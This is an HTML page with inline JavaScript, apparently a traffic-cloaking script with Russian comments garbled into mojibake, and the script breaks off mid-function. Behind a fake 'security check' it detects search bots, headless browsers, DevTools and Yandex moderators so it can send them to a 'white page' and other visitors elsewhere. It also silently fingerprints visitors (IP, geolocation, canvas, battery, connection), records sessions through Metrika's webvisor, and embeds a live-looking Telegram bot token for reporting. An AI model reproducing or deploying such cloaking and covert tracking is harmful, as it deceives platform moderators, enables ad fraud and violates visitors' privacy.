<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        /* –ü–æ–ª–Ω—ã–µ —Å—Ç–∏–ª–∏ –∏–∑ –≤–∞—à–µ–≥–æ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –ø—Ä–∏–º–µ—Ä–∞ */
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            color: #333;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #4285f4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
            color: #333;
            margin-bottom: 10px;
        }

        .human-verification {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08),
                        0 6px 12px rgba(0, 0, 0, 0.05),
                        inset 0 -3px 0 rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 340px;
            transition: all 0.5s ease-in-out, transform 0.3s ease;
            opacity: 1;
            transform: translateY(0);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .human-verification.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .human-verification h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #4285f4;
            font-size: 24px;
            font-weight: 600;
        }

        .human-verification p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #5f6368;
        }

        .mouse-icon {
            display: inline-block;
            width: 40px;
            height: 60px;
            border: 3px solid #4285f4;
            border-radius: 20px;
            position: relative;
            margin: 0 auto 15px;
        }

        .mouse-icon:before {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            background: #4285f4;
            border-radius: 50%;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            animation: mousescroll 2s infinite;
        }

        .pulse-effect {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: radial-gradient(circle, rgba(66, 133, 244, 0.3) 0%, rgba(66, 133, 244, 0) 70%);
            border-radius: 16px;
            opacity: 0;
            animation: pulse 2s infinite;
            pointer-events: none;
        }

        .bot-trap-link {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 0;
            height: 0;
            width: 0;
            top: -9999px; /* –ï—â–µ –ª—É—á—à–µ —Å–ø—Ä—è—Ç–∞—Ç—å */
            left: -9999px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0; }
            50% { transform: scale(1); opacity: 0.6; }
            100% { transform: scale(1.05); opacity: 0; }
        }

        @keyframes mousescroll {
            0% { opacity: 1; top: 10px; }
            50% { opacity: 1; top: 25px; }
            100% { opacity: 0; top: 30px; }
        }

        @keyframes cursor-animation {
            0% { transform: translate(0, 0); }
            25% { transform: translate(10px, 10px); }
            50% { transform: translate(-10px, 10px); }
            75% { transform: translate(5px, -10px); }
            100% { transform: translate(0, 0); }
        }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ */
        @media (max-width: 768px) {
            .human-verification {
                width: 85%;
                max-width: 300px;
                padding: 20px;
            }

            .loader {
                width: 50px;
                height: 50px;
            }

            .loading-text {
                font-size: 18px;
            }

            .human-verification h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
    </div>

    <div class="human-verification">
        <div class="pulse-effect"></div>
        <h3>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h3>
        <div class="mouse-icon"></div>
        <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–≤–∏–≥–∞–π—Ç–µ –∫—É—Ä—Å–æ—Ä–æ–º, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å</p>
    </div>

    <a href="#" class="bot-trap-link" aria-hidden="true" tabindex="-1">–°–µ–∫—Ä–µ—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –±–æ—Ç–æ–≤</a>

    <!-- Yandex.Metrika counter -->
    <script type="text/javascript" >
       (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
       m[i].l=1*new Date();
       for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
       k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
       (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

       ym(101122135, "init", { // –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® ID –°–ß–ï–¢–ß–ò–ö–ê
            clickmap:true,
            trackLinks:true,
            accurateTrackBounce:true,
            webvisor:true,
            defer: true // –û—Ç–ª–æ–∂–µ–Ω–Ω–∞—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
       });
    </script>
    <noscript><div><img src="https://mc.yandex.ru/watch/101122135" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® ID –°–ß–ï–¢–ß–ò–ö–ê -->
    <!-- /Yandex.Metrika counter -->

    <script>
    (async function() {
        'use strict';

        // ===== –ö–û–ù–°–¢–ê–ù–¢–´ –ò –ù–ê–°–¢–†–û–ô–ö–ò =====
        const PAGE_LOAD_START = performance.now();
        const WHITE_PAGE = 'https://dzen.ru'; // –ë–µ–ª–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
        const BLACK_PAGE = 'https://google.com'; // –ß–µ—Ä–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        const TELEGRAM_BOT_TOKEN = '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU'; // !!! –í–ê–® –¢–û–ö–ï–ù !!!
        const TELEGRAM_CHAT_ID = '1237450939'; // !!! –í–ê–® ID –ß–ê–¢–ê !!!

        // --- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é (–º–æ–≥—É—Ç –±—ã—Ç—å –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã –∏–∑ config.txt) ---
        let config = {
            common: {
                TelegramReporting: true,
                debugMode: false // –í–∫–ª—é—á–∏—Ç—å –¥–ª—è –ø–æ–¥—Ä–æ–±–Ω—ã—Ö –ª–æ–≥–æ–≤ –≤ –∫–æ–Ω—Å–æ–ª–∏
            },
            desktop: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: true,
                CheckMouseMovement: true,
                CheckVisitFrequency: true,
                MouseMovementTimeout: 5000, // –º—Å
                RedirectDelay: 1500, // –º—Å
                MaxVisitsBeforeBlock: 5,
                BlockDuration: 3600000 // 1 —á–∞—Å –≤ –º—Å
            },
            mobile: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: false,
                CheckMouseMovement: false,
                CheckVisitFrequency: false,
                RedirectDelay: 800, // –º—Å
                MaxVisitsBeforeBlock: 10,
                BlockDuration: 3600000 // 1 —á–∞—Å –≤ –º—Å
            },
            experimental: {
                CheckAdBlocker: false,
                CheckVirtualMachine: false,
                CheckTorNetwork: false,
                CheckVPN: false,
                PerformTimingAttacks: false,
                CheckWebRTCLeakage: false,
                CheckPermissionsAPI: true // –î–æ–±–∞–≤–ª–µ–Ω–æ: –ü—Ä–æ–≤–µ—Ä–∫–∞ Permissions API
            }
        };
        // --- –ö–æ–Ω–µ—Ü –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é ---

        // –°–ø–∏—Å–∫–∏ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±–æ—Ç–æ–≤ (–ü–û–õ–ù–´–ô –°–ü–ò–°–û–ö –ò–ó –í–ê–®–ï–ì–û –ü–†–ò–ú–ï–†–ê)
        const SEARCH_BOT_AGENTS = [
            // –Ø–Ω–¥–µ–∫—Å –±–æ—Ç—ã (–¢–û–õ–¨–ö–û –±–æ—Ç—ã, –Ω–µ –æ–±—ã—á–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏)
            /YandexBot/i, /YandexAccessibilityBot/i, /YandexMobileBot/i, /YandexDirectDyn/i,
            /YandexImages/i, /YandexVideo/i, /YandexVideoParser/i, /YandexMedia/i,
            /YandexBlogs/i, /YandexFavicons/i, /YandexWebmaster/i, /YandexPagechecker/i,
            /YandexImageResizer/i, /YaDirectFetcher/i, /YandexCalendar/i, /YandexSitelinks/i,
            /YandexMetrika/i, /YandexNews/i, /YandexCatalog/i, /YandexMarket/i,
            /YandexVerticals/i, /YandexVertis/i, /YandexSearchShop/i, /YandexOntoDB/i,
            /YandexOntoDBAPI/i, /YandexRCA/i, /YandexSpravBot/i, /YandexScreenshotBot/i,
            /YandexMobileScreenShotBot/i, /YandexAdNet/i, /YandexDirect/i, /YandexTurbo/i,
            /YandexRenderResourcesBot/i, /YandexTracker/i, /YandexPartner/i, /YandexComBot/i,

            // Google –±–æ—Ç—ã
            /Googlebot/i, /AdsBot-Google/i, /Google-Read-Aloud/i, /DuplexWeb-Google/i,
            /Google Favicon/i, /googleweblight/i, /Storebot-Google/i, /Google-PageRenderer/i,
            /Google-Site-Verification/i, /Google-SearchByImage/i, /GoogleAccessibilityTest/i,
            /GoogleProducer/i, /APIs-Google/i, /Google-Adwords-Instant/i, /FeedFetcher-Google/i,
            /Google-Apps-Script/i,

            // Microsoft/Bing –±–æ—Ç—ã
            /bingbot/i, /msnbot/i, /BingPreview/i, /AdIdxBot/i, /MicrosoftPreview/i, /MicrosoftSearch/i,

            // –î—Ä—É–≥–∏–µ –ø–æ–∏—Å–∫–æ–≤—ã–µ –±–æ—Ç—ã
            /slurp/i, /duckduckbot/i, /baiduspider/i, /Yahoo! Slurp/i, /YahooSeeker/i,
            /Exabot/i, /facebookexternalhit/i, /ia_archiver/i,
            /Applebot/i, /archive.org_bot/i, /BuiltWith/i, /Bot.AraTear/i, /BUbiNG/i,
            /Chrome-Lighthouse/i, /Clickagy/i, /CliniqueBot/i, /DomainStatsBot/i, /evc-batch/i,

            // –û–±—â–∏–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –¥–ª—è –±–æ—Ç–æ–≤
            /Crawler/i, /crawler/i, /Spider/i, /spider/i, /archiver/i, /validator/i,
            /parser/i, /reader/i, /indexer/i, /panscient/i, /monitoring/i,

            // SEO/–ê–Ω–∞–ª–∏—Ç–∏—á–µ—Å–∫–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã
            /semrush/i, /ahrefs/i, /mj12bot/i, /majestic/i, /rogerbot/i, /dotbot/i,
            /screaming/i, /seokicks/i, /sistrix/i, /seobilitybot/i, /seoscanners/i,
            /proximic/i, /pingdom/i, /gtmetrix/i, /pagespeed/i, /webmeup/i, /Catchpoint/i,
            /Riddler/i, /Nessus/i, /datasift/i, /BLEXBot/i, /AspiegelBot/i, /ScoutJet/i,

            // –ù–æ–≤—ã–µ –±–æ—Ç—ã –∏–∑ 2023
            /bytespider/i, /DeepCrawl/i, /Sogou/i, /MojeekBot/i,
            /SeznamBot/i, /Mail.RU_Bot/i, /SemrushBot/i, /Qwantify/i, /CensysInspect/i,
            /PetalBot/i, /Cliqzbot/i, /QwantMobile/i, /coccocbot/i, /EarwigBot/i,
            /NetcraftSurveyAgent/i, /weborama-fetcher/i, /BrightSign/i, /Cookiebot/i,
            /DataForSeoBot/i,

            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã (–Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π)
            /headless/i, /fetcher/i, /httpclient/i, /python-requests/i, /curl/i, /wget/i,
            /okhttp/i, /java/i, /perl/i, /scrapy/i, /libwww-perl/i, /zgrab/i
        ];
        const YANDEX_REGULAR_APPS = [ // –ò—Å–∫–ª—é—á–∏—Ç—å –æ–±—ã—á–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –Ø–Ω–¥–µ–∫—Å–∞ –∏ –±—Ä–∞—É–∑–µ—Ä—ã
            /YaBrowser/i, /YandexSearch/i, /Yandex\/[\d\.]+/i, /Dzen/i, /YandexMobileApp/i
        ];
        const YANDEX_DOMAINS = [ // –î–æ–º–µ–Ω—ã –Ø–Ω–¥–µ–∫—Å–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ DNS
            '.yandex.ru', '.yandex.net', '.yandex.com', '.yandex.by', '.yandex.kz',
            '.yandex.ua', '.yandex.md', '.yandex.com.tr', '.yandex.com.am'
        ];
        // –°—Ç—Ä–æ–≥–∏–π –ø–∞—Ç—Ç–µ—Ä–Ω –¥–ª—è –Ø.–ë–æ—Ç–æ–≤ (–Ω–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
        const strictYandexBotPattern = /YandexBot|YandexAccessibilityBot|YandexMobileBot|YandexDirectDyn|YandexImages|YandexVideo|YandexVideoParser|YandexMedia|YandexBlogs|YandexFavicons|YandexWebmaster|YandexPagechecker|YandexImageResizer|YaDirectFetcher|YandexCalendar|YandexSitelinks|YandexMetrika|YandexNews|YandexCatalog|YandexMarket|YandexVerticals|YandexVertis|YandexSearchShop|YandexOntoDB|YandexOntoDBAPI|YandexRCA|YandexSpravBot|YandexScreenshotBot|YandexMobileScreenShotBot|YandexAdNet|YandexDirect|YandexTurbo|YandexRenderResourcesBot|YandexTracker|YandexPartner|YandexComBot|MirrorDetector/i;

        // –§–ª–∞–≥–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        let botTrapActivated = false;
        let hadMouseMovement = false;
        let pageFullyLoaded = false;
        let redirectInitiated = false;
        let mouseMoveTimeout = null;
        let redirectTimeout = null;
        let userInfo = null; // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ–±—Ä–∞–Ω–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
        let onOffState = 'on'; // –°–æ—Å—Ç–æ—è–Ω–∏–µ onoff.txt –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        let blockReason = ''; // –ü—Ä–∏—á–∏–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏

        // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
        let humanVerificationBlock = null; // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –ø–æ–∑–∂–µ

        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–∏–ø–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const userAgent = navigator.userAgent || '';
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

        // –°—á–µ—Ç—á–∏–∫ –≤–∏–∑–∏—Ç–æ–≤
        let visitCount = 0;
        try {
            visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
            localStorage.setItem('visitCount', visitCount.toString());
        } catch (e) { console.warn("LocalStorage –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è —Å—á–µ—Ç—á–∏–∫–∞ –≤–∏–∑–∏—Ç–æ–≤."); }

        // ===== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò =====

        // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
        function logDebug(message, ...args) {
            if (config.common.debugMode) {
                console.log(`[Cloak Debug] ${message}`, ...args);
            }
        }

        // –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞
        async function loadFile(url) {
            try {
                const response = await fetch(url, { cache: 'no-store' }); // –î–æ–±–∞–≤–ª–µ–Ω–æ cache: 'no-store'
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return await response.text();
            } catch (error) {
                logDebug(`–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª ${url}:`, error);
                return null;
            }
        }

        // –ü–∞—Ä—Å–∏–Ω–≥ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
        function parseConfig(configText) {
             if (!configText) return;
            logDebug("–ü–∞—Ä—Å–∏–Ω–≥ config.txt...");
             let currentSection = 'common';
            const lines = configText.split('\n');

            for (const line of lines) {
                const trimmedLine = line.trim();
                if (!trimmedLine || trimmedLine.startsWith('#')) continue;
                if (trimmedLine.startsWith('[')) {
                    const sectionMatch = trimmedLine.match(/\[(.*?)\]/);
                    if (sectionMatch) {
                        currentSection = sectionMatch[1].toLowerCase();
                        if (!config[currentSection]) config[currentSection] = {}; // –°–æ–∑–¥–∞–µ–º —Å–µ–∫—Ü–∏—é, –µ—Å–ª–∏ –µ–µ –Ω–µ—Ç
                        logDebug(`–ü–µ—Ä–µ–∫–ª—é—á–∏–ª–∏—Å—å –Ω–∞ —Å–µ–∫—Ü–∏—é: [${currentSection}]`);
                    }
                    continue;
                }
                const parts = trimmedLine.split('=');
                if (parts.length === 2) {
                    const key = parts[0].trim();
                    const value = parts[1].trim().toLowerCase();
                    let targetSection = config[currentSection] || config.common; // –ò—Å–ø–æ–ª—å–∑—É–µ–º common, –µ—Å–ª–∏ —Å–µ–∫—Ü–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞

                    let parsedValue;
                    if (value === 'on' || value === 'true') {
                        parsedValue = true;
                    } else if (value === 'off' || value === 'false') {
                        parsedValue = false;
                    } else if (!isNaN(parseInt(value))) {
                        parsedValue = parseInt(value);
                    } else {
                        parsedValue = value; // –û—Å—Ç–∞–≤–ª—è–µ–º –∫–∞–∫ —Å—Ç—Ä–æ–∫—É, –µ—Å–ª–∏ –Ω–µ —á–∏—Å–ª–æ –∏ –Ω–µ boolean
                    }
                    targetSection[key] = parsedValue;
                    logDebug(`–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä [${currentSection}].${key} = ${parsedValue}`);
                }
            }
            logDebug("–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∑–∞–≥—Ä—É–∂–µ–Ω–∞:", config);
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –∏–∑ URL
        function getUrlParameter(name) {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get(name);
            } catch (e) {
                logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ URL –ø–∞—Ä–∞–º–µ—Ç—Ä–∞:", e);
                return null;
            }
        }

        // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —á–∞—Å—Ç–æ—Ç—ã –≤–∏–∑–∏—Ç–æ–≤
        function trackVisits() {
            try {
                const now = Date.now();
                const visits = JSON.parse(localStorage.getItem('recentVisits') || '[]');
                const recentVisits = visits.filter(timestamp => now - timestamp < 30 * 60 * 1000); // 30 –º–∏–Ω—É—Ç
                recentVisits.push(now);
                localStorage.setItem('recentVisits', JSON.stringify(recentVisits));
                return recentVisits.length;
            } catch (e) {
                logDebug("LocalStorage –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —á–∞—Å—Ç–æ—Ç—ã –≤–∏–∑–∏—Ç–æ–≤.");
                return 1; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º 1, —á—Ç–æ–±—ã –Ω–µ –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏
            }
        }

        // –ü—Ä–æ–≤–µ—Ä–∫–∞, –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ —á–∞—Å—Ç–æ—Ç–µ
        function isBlockedByFrequency() {
            const currentConfig = isMobile ? config.mobile : config.desktop;
            if (!currentConfig.CheckVisitFrequency || onOffState === 'off') {
                logDebug("–ü—Ä–æ–≤–µ—Ä–∫–∞ —á–∞—Å—Ç–æ—Ç—ã –æ—Ç–∫–ª—é—á–µ–Ω–∞ (–∫–æ–Ω—Ñ–∏–≥ –∏–ª–∏ onoff.txt).");
                return false;
            }

            try {
                const blockExpiry = parseInt(localStorage.getItem('blockExpiry') || '0');
                if (blockExpiry > Date.now()) {
                    logDebug("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ø–æ —á–∞—Å—Ç–æ—Ç–µ (—Å—Ä–æ–∫ –µ—â–µ –Ω–µ –∏—Å—Ç–µ–∫).");
                    return true;
                }

                const visitCount = trackVisits();
                const maxVisits = currentConfig.MaxVisitsBeforeBlock;
                logDebug(`–ß–∞—Å—Ç–æ—Ç–∞ –≤–∏–∑–∏—Ç–æ–≤: ${visitCount} / ${maxVisits}`);

                if (visitCount > maxVisits) {
                    const blockUntil = Date.now() + currentConfig.BlockDuration;
                    localStorage.setItem('blockExpiry', blockUntil.toString());
                    logDebug(`–ü—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç —á–∞—Å—Ç–æ—Ç—ã. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –¥–æ ${new Date(blockUntil).toISOString()}`);
                    return true;
                }
            } catch (e) {
                logDebug("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —á–∞—Å—Ç–æ—Ç—ã –≤–∏–∑–∏—Ç–æ–≤:", e);
            }
            return false;
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        async function getIpAddress() {
            const services = [
                { url: 'https://api.ipify.org?format=json', extract: data => data.ip },
                { url: 'https://ipinfo.io/json', extract: data => data.ip },
                { url: 'https://api.myip.com', extract: data => data.ip }, // –í–µ—Ä–Ω—É–ª–∏ —Å–µ—Ä–≤–∏—Å –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞
                { url: 'https://ipapi.co/json/', extract: data => data.ip }
            ];
            for (const service of services) {
                try {
                    // –ò—Å–ø–æ–ª—å–∑—É–µ–º AbortSignal –¥–ª—è —Ç–∞–π–º–∞—É—Ç–∞
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 —Å–µ–∫ —Ç–∞–π–º–∞—É—Ç
                    const response = await fetch(service.url, { signal: controller.signal });
                    clearTimeout(timeoutId); // –û—á–∏—â–∞–µ–º —Ç–∞–π–º–∞—É—Ç, –µ—Å–ª–∏ –æ—Ç–≤–µ—Ç –ø—Ä–∏—à–µ–ª –≤–æ–≤—Ä–µ–º—è

                    if (response.ok) {
                        const data = await response.json();
                        const ip = service.extract(data);
                        if (ip) {
                            logDebug(`IP –∞–¥—Ä–µ—Å –ø–æ–ª—É—á–µ–Ω —á–µ—Ä–µ–∑ ${service.url}: ${ip}`);
                            return ip;
                        }
                    }
                } catch (error) {
                    logDebug(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP —á–µ—Ä–µ–∑ ${service.url}:`, error.name === 'AbortError' ? 'Timeout' : error);
                }
            }
            logDebug("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å IP-–∞–¥—Ä–µ—Å –Ω–∏ –æ–¥–Ω–∏–º –∏–∑ —Å–µ—Ä–≤–∏—Å–æ–≤.");
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ Canvas Fingerprint (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞)
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;

                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#00f';
                ctx.fillText('Canvas Fingerprint üëã', 2, 2); // –¢–µ–∫—Å—Ç –∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞
                ctx.fillStyle = '#f00';
                ctx.beginPath(); // –î–æ–±–∞–≤–∏–ª beginPath
                ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
                ctx.fill();

                // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –Ω–∞—á–∞–ª–æ Data URL –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ
                return canvas.toDataURL().substring(0, 100) + '...';
            } catch (e) {
                logDebug("Canvas API –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ –∏–ª–∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ.");
                return "Canvas –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            try {
                const battery = await navigator.getBattery();
                return { level: Math.round(battery.level * 100), charging: battery.charging };
            } catch (e) {
                logDebug("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ Battery API:", e);
                return "–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞";
            }
        }

        // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–º—è—Ç–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        function getDeviceMemory() {
            return navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–µ–≤–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
        function getConnectionInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
            // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –æ–±—ä–µ–∫—Ç –∫–∞–∫ –≤ –æ—Ä–∏–≥–∏–Ω–∞–ª–µ
            return {
                type: conn.effectiveType || "unknown",
                rtt: conn.rtt || "unknown"
            };
        }

        // –°–±–æ—Ä –ø–æ–ª–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ (–∏–∑ –æ—Ä–∏–≥–∏–Ω–∞–ª–∞, —Å –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ—Å—Ç—å—é)
        async function collectUserInfo() {
            logDebug("–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ...");
            const startTime = performance.now();
            let info = {};

            try {
                // –ó–∞–ø—É—Å–∫–∞–µ–º –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
                const ipPromise = getIpAddress();
                const batteryPromise = getBatteryInfo();
                const geoPromise = ipPromise.then(ip => {
                    if (ip && ip !== "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") {
                        return fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) })
                               .then(response => response.ok ? response.json() : Promise.reject('Geo API failed'))
                               .then(geoData => `${geoData.city || ""}, ${geoData.country_name || ""}`)
                               .catch(e => {
